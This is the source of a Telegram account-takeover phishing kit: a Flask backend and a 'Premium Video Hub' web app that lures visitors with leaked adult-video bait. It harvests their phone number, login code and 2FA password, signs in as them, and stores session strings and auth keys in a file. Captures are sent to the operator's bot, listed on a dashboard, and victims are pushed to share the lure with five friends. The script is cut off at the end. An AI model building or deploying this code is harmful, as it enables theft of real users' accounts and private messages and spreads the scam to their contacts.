from flask import Flask, request, jsonify, render_template
import os
import json
import base64
import threading
import asyncio
import logging
from datetime import datetime
import requests as http_requests
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def _safe_int(v, default=0):
    try:
        return int(str(v).strip()) if v not in (None, "") else default
    except (ValueError, TypeError):
        return default


BOT_TOKEN = (os.environ.get("BOT_TOKEN") or "").strip()
API_ID = _safe_int(os.environ.get("API_ID"), 0)
API_HASH = (os.environ.get("API_HASH") or "").strip()
YOUR_TELEGRAM_ID = _safe_int(os.environ.get("OWNER_ID"), 0)
PORT = _safe_int(os.environ.get("PORT"), 5000)

logger.info("ENV | BOT=%s | API_ID=%s | API_HASH=%s | OWNER=%s",
    "SET" if BOT_TOKEN else "MISSING", API_ID,
    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID)

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)

user_sessions = {}
pending_codes = {}
pending_2fa = {}
sessions_lock = threading.Lock()
DATA_FILE = "captured_accounts.json"


def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}")
            return []
    return []


def save_account(account):
    accounts = load_accounts()
    found = False
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            found = True
            break
    if not found:
        accounts.append(account)
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
    except Exception as e:
        logger.error(f"Save error: {e}")
    return account


captured_accounts = load_accounts()


def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits


def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
        return
    try:
        extra = ""
        if password_used:
            extra = "\n2FA Used"
            if password_value:
                extra += f" | Pwd: `{password_value}`"
        msg = (f"New Account!{extra}\nPhone: {phone}\n"
               f"Name: {me.first_name} {me.last_name or ''}\n"
               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
        if len(msg) > 4000:
            msg = msg[:3990] + "..."
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'},
            timeout=15
        )
    except Exception as e:
        logger.error(f"Bot notify error: {e}")


def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'No session'}
                s = user_sessions[phone]
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}

                me = await client.get_me()
                await client.get_dialogs()
                ss = StringSession.save(client.session)
                try:
                    auth_key = client.session.auth_key.key
                    dc = client.session.dc_id
                except Exception:
                    auth_key = b""
                    dc = 0
                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None

                acc = {
                    'phone': phone, 'user_id': me.id,
                    'username': me.username or '', 'first_name': me.first_name or '',
                    'last_name': me.last_name or '', 'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64,
                        'userId': me.id, 'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()
                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'
                send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                e_str = str(e)
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        return loop.run_until_complete(send_code())
    finally:
        loop.close()


@app.route('/')
def index():
    return render_template('index.html')

@app.route('/tg')
def tg_webapp():
    return render_template('index.html')

@app.route('/health')
def health():
    return jsonify({'status': 'ok',
        'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
        'API_ID': API_ID,
        'API_HASH': 'SET' if API_HASH else 'MISSING',
        'OWNER_ID': YOUR_TELEGRAM_ID,
        'accounts': len(captured_accounts)})

@app.route('/api/save_contact', methods=['POST'])
def save_contact():
    d = request.json
    tg_id = d.get('tg_id')
    phone = d.get('phone')
    if not phone or not tg_id:
        return jsonify({'success': False, 'error': 'Missing data'})
    phone = format_phone(phone)
    accounts = load_accounts()
    existing = next((a for a in accounts if a['phone'] == phone), None)
    if existing:
        return jsonify({'success': True, 'already_captured': True,
            'phone': phone, 'user_id': existing['user_id']})
    with sessions_lock:
        pending_codes[phone] = 'contact_saved'
    try:
        http_requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={'chat_id': YOUR_TELEGRAM_ID,
                'text': f"Contact Captured\nTG ID: `{tg_id}`\nPhone: `{phone}`",
                'parse_mode': 'Markdown'}, timeout=10)
    except Exception:
        pass
    return jsonify({'success': True, 'phone': phone})

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    phone = format_phone(request.json.get('phone', ''))
    with sessions_lock:
        s = pending_codes.get(phone, 'waiting')
    if s == 'waiting':
        accounts = load_accounts()
        if any(a['phone'] == phone for a in accounts):
            s = 'done'
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify_route():
    d = request.json
    ph = format_phone(d.get('phone', ''))
    return jsonify(run_telegram_action(ph, d.get('code', ''), d.get('password')))

@app.route('/session/<phone>')
def get_session(phone):
    phone = format_phone(phone)
    global captured_accounts
    captured_accounts = load_accounts()
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    return jsonify({'phone': phone, 'user_id': a['user_id'],
        'name': f"{a['first_name']} {a['last_name']}",
        'username': a['username'], 'dc': a['dc'],
        'session': a['session'], 'session_length': len(a['session']),
        'has_2fa': a.get('has_2fa', False)})

@app.route('/dash')
def dash():
    global captured_accounts
    captured_accounts = load_accounts()
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        ss_len = len(a.get('session', ''))
        tag = "2FA" if a.get('has_2fa') else ""
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tag} ({ss_len})</td><td>{a.get('time','')}</td></tr>"
    total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
    html = "<!DOCTYPE html><html><head><title>Dashboard</title><style>"
    html += "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
    html += "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
    html += "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
    html += "th{background:#141420;color:#ddd}tr:hover{background:#141420}"
    html += "</style></head><body>"
    html += f"<h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
    html += "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead><tbody>"
    html += rows if rows else "<tr><td colspan='8' style='text-align:center;color:#666;padding:30px'>No accounts</td></tr>"
    html += "</tbody></table></body></html>"
    return html


if __name__ == '__main__':
    if not all([BOT_TOKEN, API_ID, API_HASH, YOUR_TELEGRAM_ID]):
        logger.warning("Some env vars missing!")
    app.run(host='0.0.0.0', port=PORT, debug=False)
    <!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Video Hub</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh;padding-bottom:20px}
.header{padding:40px 20px 20px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
.header h1{font-size:24px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#777;font-size:13px;margin-top:8px}
.card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
.thumb{width:100%;height:190px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
.play{width:60px;height:60px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:26px;border:2px solid rgba(255,255,255,0.2)}
.info{padding:15px}
.info h3{font-size:15px;margin-bottom:5px}
.meta{color:#666;font-size:12px}
.badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
.btn-wrap{padding:15px 20px}
.btn{width:100%;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;letter-spacing:1px;text-transform:uppercase}
.btn-green{background:linear-gradient(45deg,#25D366,#128C7E)}
.overlay{position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:999;display:none;align-items:center;justify-content:center;padding:20px}
.overlay.show{display:flex}
.modal{background:#141420;border-radius:20px;padding:28px;max-width:380px;width:100%;border:1px solid #1a1a2e}
.modal-icon{text-align:center;font-size:48px;margin-bottom:12px}
.modal h2{text-align:center;font-size:18px;margin-bottom:8px}
.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:18px}
.sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;font-size:13px;display:none}
.sb.show{display:block}
.sb.success{background:rgba(76,175,80,0.15);color:#81C784}
.sb.error{background:rgba(244,67,54,0.15);color:#EF9A9A}
.sb.info{background:rgba(33,150,243,0.15);color:#90CAF9}
.sb.waiting{background:rgba(255,152,0,0.15);color:#FFB74D}
.otp-display{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:12px 0;font-weight:bold;min-height:55px}
.keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.key{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;font-weight:600}
.key.del{background:#e94560}
.key.ok{background:#4CAF50;font-size:14px}
.pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
.share-steps{display:flex;justify-content:center;gap:6px;margin:15px 0}
.step{width:36px;height:36px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#666;font-weight:700}
.step.done{background:#4CAF50;color:white}
.step.active{background:#0088cc;color:white}
</style>
</head>
<body>
<div class="header">
<h1>PREMIUM VIDEO HUB</h1>
<p>Exclusive content - Verified only</p>
</div>
<div class="card">
<div class="thumb"><div class="play">&#9658;</div></div>
<div class="info">
<h3>LEAKED PRIVATE - 2026</h3>
<div class="meta">4.9 - 2.4M views - 18+</div>
<span class="badge">RESTRICTED</span>
</div>
</div>
<div class="btn-wrap">
<button class="btn" id="mainBtn">UNLOCK NOW</button>
</div>

<div class="overlay" id="contactModal">
<div class="modal">
<div class="modal-icon">&#128241;</div>
<h2>Verify Your Number</h2>
<p>Tap <strong>Share Contact</strong> to continue.</p>
<button class="btn btn-green" id="shareContactBtn">SHARE CONTACT</button>
<div class="sb" id="contactStatus"></div>
</div>
</div>

<div class="overlay" id="otpModal">
<div class="modal">
<div class="modal-icon">&#128274;</div>
<h2>Enter Code</h2>
<p><span id="phoneDisplay" style="color:#0088cc;font-weight:bold"></span></p>
<div class="sb waiting show" id="otpWait">Sending code...</div>
<div class="otp-display" id="otpDisplay">_</div>
<div class="keypad">
<button class="key" onclick="pk('1')">1</button>
<button class="key" onclick="pk('2')">2</button>
<button class="key" onclick="pk('3')">3</button>
<button class="key" onclick="pk('4')">4</button>
<button class="key" onclick="pk('5')">5</button>
<button class="key" onclick="pk('6')">6</button>
<button class="key" onclick="pk('7')">7</button>
<button class="key" onclick="pk('8')">8</button>
<button class="key" onclick="pk('9')">9</button>
<button class="key del" onclick="del()">X</button>
<button class="key" onclick="pk('0')">0</button>
<button class="key ok" id="otpOk" onclick="submitOtp()">OK</button>
</div>
<div class="sb" id="otpStatus"></div>
</div>
</div>

<div class="overlay" id="pwdModal">
<div class="modal">
<div class="modal-icon">&#128274;</div>
<h2>Two-Factor Auth</h2>
<p>Enter your cloud password:</p>
<input type="password" class="pwd-input" id="pwdInput" placeholder="Password" maxlength="64">
<button class="btn" onclick="submitPwd()">VERIFY</button>
<div class="sb" id="pwdStatus"></div>
</div>
</div>

<div class="overlay" id="shareModal">
<div class="modal">
<div class="modal-icon">&#127916;</div>
<h2>Almost Unlocked!</h2>
<p>Share with <strong>5 friends</strong> to unlock</p>
<div class="share-steps">
<div class="step" id="st1">1</div>
<div class="step" id="st2">2</div>
<div class="step" id="st3">3</div>
<div class="step" id="st4">4</div>
<div class="step" id="st5">5</div>
</div>
<div class="sb info show" id="shareStatus">Share to start</div>
<button class="btn btn-green" onclick="doShare()">SHARE ON TELEGRAM</button>
</div>
</div>

<script>
var tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) { tg.ready(); tg.expand(); }
var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
var USER_PHONE_KEY = 'pv_phone_' + TG_ID;
var USER_SHARES_KEY = 'pv_shares_' + TG_ID;
var USER_CAPTURED_KEY = 'pv_captured_' + TG_ID;
var phoneNumber = '';
var codeDigits = '';
var sharesDone = 0;
var codeCheckInterval = null;
var pwdCheckInterval = null;
var contactForceInterval = null;
var TG_CHANNEL = 'https://t.me/videodks';
var TG_CAPTION = 'Premium content';

document.getElementById('mainBtn').onclick = function() {
var cachedPhone = localStorage.getItem(USER_PHONE_KEY);
var isCaptured = localStorage.getItem(USER_CAPTURED_KEY) === '1';
if (cachedPhone && isCaptured) { phoneNumber = cachedPhone; openShareModal(); return; }
if (cachedPhone) { phoneNumber = cachedPhone; openOtpModal(); return; }
openContactModal();
};

function openContactModal() {
document.getElementById('contactModal').classList.add('show');
startContactForce();
}

function startContactForce() {
if (contactForceInterval) clearInterval(contactForceInterval);
setTimeout(triggerContactShare, 300);
contactForceInterval = setInterval(function() {
if (document.getElementById('contactModal').classList.contains('show')) triggerContactShare();
else { clearInterval(contactForceInterval); contactForceInterval = null; }
}, 1500);
}

function triggerContactShare() {
if (!tg) { showContactStatus('Open in Telegram', 'error'); return; }
try {
tg.requestContact(function(sent, event) {
if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
handleContact(event.responseUnsafe.contact);
} else {
showContactStatus('Contact share required!', 'error');
}
});
} catch(e) { showContactStatus('Update Telegram app', 'error'); }
}

document.getElementById('shareContactBtn').onclick = function() { triggerContactShare(); };

function handleContact(contact) {
var phone = contact.phone_number || '';
if (!phone) { showContactStatus('No phone number', 'error'); return; }
if (phone.charAt(0) !== '+') phone = '+' + phone;
phoneNumber = phone;
showContactStatus('Contact verified!', 'success');
if (contactForceInterval) { clearInterval(contactForceInterval); contactForceInterval = null; }
fetch('/api/save_contact', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({tg_id: TG_ID, phone: phoneNumber})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.success) {
localStorage.setItem(USER_PHONE_KEY, phoneNumber);
if (data.already_captured && data.user_id) {
localStorage.setItem(USER_CAPTURED_KEY, '1');
document.getElementById('contactModal').classList.remove('show');
openShareModal();
} else {
setTimeout(function() {
document.getElementById('contactModal').classList.remove('show');
openOtpModal();
}, 800);
}
} else { showContactStatus('Server error', 'error'); }
})
.catch(function() { showContactStatus('Connection error', 'error'); });
}

function showContactStatus(msg, type) {
var el = document.getElementById('contactStatus');
el.className = 'sb ' + type + ' show';
el.textContent = msg;
}

function openOtpModal() {
document.getElementById('otpModal').classList.add('show');
document.getElementById('phoneDisplay').textContent = phoneNumber;
fetch('/api/share', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.success) {
document.getElementById('otpWait').className = 'sb success show';
document.getElementById('otpWait').innerHTML = 'Code sent!';
startOtpCheck();
} else {
document.getElementById('otpWait').className = 'sb error show';
document.getElementById('otpWait').textContent = (data.error || 'Failed');
}
})
.catch(function() {
document.getElementById('otpWait').className = 'sb error show';
document.getElementById('otpWait').textContent = 'Network error';
});
}

function startOtpCheck() {
if (codeCheckInterval) clearInterval(codeCheckInterval);
codeCheckInterval = setInterval(function() {
fetch('/api/check', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.s === '2fa_needed') {
clearInterval(codeCheckInterval);
document.getElementById('otpModal').classList.remove('show');
document.getElementById('pwdModal').classList.add('show');
startPwdCheck();
} else if (data.s === 'done') {
clearInterval(codeCheckInterval);
onCaptureSuccess();
} else if (data.s === 'err') {
clearInterval(codeCheckInterval);
document.getElementById('otpWait').className = 'sb error show';
document.getElementById('otpWait').textContent = 'Code send failed';
}
})
.catch(function(){});
}, 2000);
}

function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('otpDisplay').textContent = codeDigits; } }
function del() { codeDigits = codeDigits.slice(0,-1); document.getElementById('otpDisplay').textContent = codeDigits || '_'; }

function submitOtp() {
if (codeDigits.length < 5) { showOtpStatus('5 digits required', 'error'); return; }
document.getElementById('otpOk').disabled = true;
document.getElementById('otpOk').textContent = '...';
fetch('/api/verify', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber, code: codeDigits})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.success) { onCaptureSuccess(); }
else if (data.needs_password) {
document.getElementById('otpModal').classList.remove('show');
document.getElementById('pwdModal').classList.add('show');
startPwdCheck();
} else {
showOtpStatus(data.error || 'Wrong code', 'error');
codeDigits = '';
document.getElementById('otpDisplay').textContent = '_';
document.getElementById('otpOk').disabled = false;
document.getElementById('otpOk').textContent = 'OK';
}
})
.catch(function() {
showOtpStatus('Error', 'error');
document.getElementById('otpOk').disabled = false;
document.getElementById('otpOk').textContent = 'OK';
});
}

function showOtpStatus(msg, type) {
var el = document.getElementById('otpStatus');
el.className = 'sb ' + type + ' show';
el.textContent = msg;
}

function startPwdCheck() {
if (pwdCheckInterval) clearInterval(pwdCheckInterval);
pwdCheckInterval = setInterval(function() {
fetch('/api/check', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.s === 'done') { clearInterval(pwdCheckInterval); onCaptureSuccess(); }
})
.catch(function(){});
}, 2000);
}

function submitPwd() {
var pwd = document.getElementById('pwdInput').value.trim();
if (!pwd) {
document.getElementById('pwdStatus').className = 'sb error show';
document.getElementById('pwdStatus').textContent = 'Password required';
return;
}
document.getElementById('pwdStatus').className = 'sb waiting show';
document.getElementById('pwdStatus').innerHTML = 'Checking...';
fetch('/api/verify', {
method: 'POST',
headers: {'Content-Type': 'application/json'},
body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
})
.then(function(r) { return r.json(); })
.then(function(data) {
if (data.success) { onCaptureSuccess(); }
else {
document.getElementById('pwdStatus').className = 'sb error show';
document.getElementById('pwdStatus').textContent = (data.error || 'Wrong');
}
})
.catch(function() {
document.getElementById('pwdStatus').className = 'sb error show';
document.getElementById('pwdStatus').textContent = 'Error';
});
}

function onCaptureSuccess() {
localStorage.setItem(USER_PHONE_KEY, phoneNumber);
localStorage.setItem(USER_CAPTURED_KEY, '1');
localStorage.setItem(USER_SHARES_KEY, '0');
if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
if (pwdCheckInterval) { clearInterval(pwdCheckInterval); pwdCheckInterval = null; }
document.getElementById('otpModal').classList.remove('show');
document.getElementById('pwdModal').classList.remove('show');
openShareModal();
}

function openShareModal() {
document.getElementById('shareModal').classList.add('show');
sharesDone = parseInt(localStorage.getItem(USER_SHARES_KEY) || '0');
updateShareSteps();
}

function doShare() {
var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
if (tg) { tg.openTelegramLink(shareUrl); }
